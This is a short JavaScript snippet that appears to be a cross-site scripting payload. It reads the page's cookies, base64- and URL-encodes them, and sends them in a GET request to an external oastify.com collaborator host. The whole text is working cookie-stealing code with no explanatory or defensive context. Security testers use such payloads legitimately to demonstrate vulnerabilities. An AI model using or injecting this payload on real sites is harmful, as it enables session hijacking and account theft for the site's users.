function httpGet(theUrl)
{
    let xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, true );
    xmlHttp.send( null );
}
let cookies = document.cookie;
let encoded = encodeURIComponent(btoa(cookies));

httpGet('https://t938f64qxb91g56ufazgnckv3m9cx1.oastify.com/?cookie='.concat(encoded));
